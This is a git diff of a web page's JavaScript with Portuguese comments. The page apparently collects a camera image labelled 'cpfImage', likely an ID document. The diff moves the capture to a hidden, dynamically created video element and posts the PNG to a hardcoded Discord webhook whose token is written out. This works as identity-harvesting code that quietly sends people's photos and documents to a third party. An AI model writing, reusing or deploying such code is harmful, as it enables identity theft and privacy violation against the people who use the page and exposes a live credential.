@@ -111,39 +111,41 @@ particlesJS('particles-js', {
 });
 
 document.getElementById('captureButton').addEventListener('click', function() {
-    const video = document.getElementById('video');
-
     // Acessar a câmera
     navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
+            const video = document.createElement('video');
             video.srcObject = stream;
             video.play();
 
             // Capturar a imagem da câmera
-            setTimeout(() => {
-                html2canvas(video).then(canvas => {
-                    const imgData = canvas.toDataURL('image/png');
+            video.onloadedmetadata = () => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imgData = canvas.toDataURL('image/png');
 
-                    // Enviar a imagem para o webhook
-                    fetch('https://discord.com/api/webhooks/1499662564920000664/j_IYz_TcfwnnTEgS-Or1fzCclhg7YATKlxpCpZEXvfDq3cqwuLi_XqQr4paAlRrTWHmk', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({ cpfImage: imgData })
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        console.log('Sucesso:', data);
-                    })
-                    .catch((error) => {
-                        console.error('Erro:', error);
-                    });
-
-                    // Parar a câmera
-                    stream.getTracks().forEach(track => track.stop());
+                // Enviar a imagem para o webhook
+                fetch('https://discord.com/api/webhooks/1499662564920000664/j_IYz_TcfwnnTEgS-Or1fzCclhg7YATKlxpCpZEXvfDq3cqwuLi_XqQr4paAlRrTWHmk', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ cpfImage: imgData })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Sucesso:', data);
+                })
+                .catch((error) => {
+                    console.error('Erro:', error);
                 });
-            }, 1000); // Ajuste o tempo de espera conforme necessário
+
+                // Parar a câmera
+                stream.getTracks().forEach(track => track.stop());
+            };
         })
         .catch(err => {
             console.error('Erro ao acessar a câmera:', err);
